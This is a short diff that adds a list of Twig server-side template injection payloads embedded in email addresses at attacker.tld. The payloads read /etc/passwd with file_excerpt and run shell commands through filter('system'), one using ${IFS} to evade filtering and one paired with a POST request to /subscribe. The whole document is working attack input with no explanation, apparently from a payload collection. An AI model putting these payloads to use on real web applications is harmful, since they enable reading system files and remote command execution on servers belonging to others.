@@ -1,0 +1,8 @@
+email="{{'/etc/passwd'|file_excerpt(1,30)}}"@attacker.tld
+
+
+email="{{['cat${IFS}/etc/passwd']|filter('system')}}"@attacker.tld
+
+
+POST /subscribe?0=cat+/etc/passwd HTTP/1.1
+email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
